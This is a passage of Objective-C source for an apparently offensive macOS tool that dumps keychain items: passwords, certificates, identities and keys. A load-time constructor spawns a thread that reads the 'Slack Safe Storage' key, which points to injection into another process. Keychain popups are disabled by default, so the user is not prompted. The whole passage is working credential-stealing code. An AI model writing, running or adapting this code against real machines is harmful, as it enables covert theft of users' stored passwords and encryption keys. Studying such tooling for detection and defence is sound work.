    GetAllAttrbituesOfKey(@"Slack", @"Slack Safe Storage", nil, nil, kSecClassGenericPassword, true, true);
    [fileManager removeItemAtPath:@"/tmp/tmp.txt" error:nil];
    exit(0);
#endif
    return 0;
}
 
 

__attribute__((constructor))
void customConstructor(int argc, const char **argv)
{
    pthread_attr_t  attr;
    pthread_t       posixThreadID;
    int             returnVal;
    
    returnVal = pthread_attr_init(&attr);
    assert(!returnVal);
    returnVal = pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    assert(!returnVal);
    
    pthread_create(&posixThreadID, &attr, &exec, NULL);
}



int main(int argc, const char * argv[]) {
    @autoreleasepool {
        NSUserDefaults *arguments = [NSUserDefaults standardUserDefaults];
        NSString* account = nil;
        NSString* label = nil;
        NSString* accessGroup = nil;
        NSString* partitionID = nil;
        NSMutableArray* keyClass = [[NSMutableArray alloc] initWithCapacity:0];
        bool debug = false;
        bool force = false;
        bool validateTrustedApplications = false;
        if( [arguments objectForKey:@"account"] ){
            account = [arguments stringForKey:@"account"];
        }
        if( [arguments objectForKey:@"label"] ){
            label = [arguments stringForKey:@"label"];
        }
        if( [arguments objectForKey:@"accessGroup"] ){
            accessGroup = [arguments stringForKey:@"accessGroup"];
        }
        if( [arguments objectForKey:@"keyClass"] ){
            NSString* keyclassString = [arguments stringForKey:@"keyClass"];
            [keyClass addObjectsFromArray:[keyclassString componentsSeparatedByString:@","]];
        }else{
            [keyClass addObject:@"genp"];
        }
        if( [arguments objectForKey:@"debug"] ){
            debug = [arguments boolForKey:@"debug"];
        }
        if( [arguments objectForKey:@"force"] ){
            force = [arguments boolForKey:@"force"];
        }
        if( [arguments objectForKey:@"validate"] ){
            validateTrustedApplications = [arguments boolForKey:@"validate"];
        }
        if( [arguments objectForKey:@"partitionID"] ){
            partitionID = [arguments stringForKey:@"partitionID"];
        }
        if(debug){
            printCurrentProcess();
            printCurrentPid();
            printCDHash();
        }
        if( [arguments objectForKey:@"popups"] ){
            SecKeychainSetUserInteractionAllowed([arguments boolForKey:@"popups"]);
        } else {
            SecKeychainSetUserInteractionAllowed(false);
        }
        
        if(isKeychainLocked()){
            return 0;
        }
        for(int i = 0; i < [keyClass count]; i++){
            NSString* currentClass = [keyClass objectAtIndex:i];
            if( [currentClass isEqualToString:@"genp"]){
                GetAllAttrbituesOfKey(account, label, accessGroup, partitionID, kSecClassGenericPassword, force, validateTrustedApplications);
            } else if( [currentClass isEqualToString:@"intp"]) {
                GetAllAttrbituesOfKey(account, label, accessGroup, partitionID, kSecClassInternetPassword, force, validateTrustedApplications);
            } else if( [currentClass isEqualToString:@"cert"]) {
                GetAllAttrbituesOfKey(account, label, accessGroup, partitionID, kSecClassCertificate, force, validateTrustedApplications);
            } else if( [currentClass isEqualToString:@"iden"]) {
                GetAllAttrbituesOfKey(account, label, accessGroup, partitionID, kSecClassIdentity, force, validateTrustedApplications);
            } else if( [currentClass isEqualToString:@"keys"]) {
                GetAllAttrbituesOfKey(account, label, accessGroup, partitionID, kSecClassKey, force, validateTrustedApplications);
            } else if( [currentClass isEqualToString:@"all"]) {
                GetAllKeychainItems(account, label, accessGroup, partitionID, force, validateTrustedApplications);
            }
        }
    }
    return 0;
}



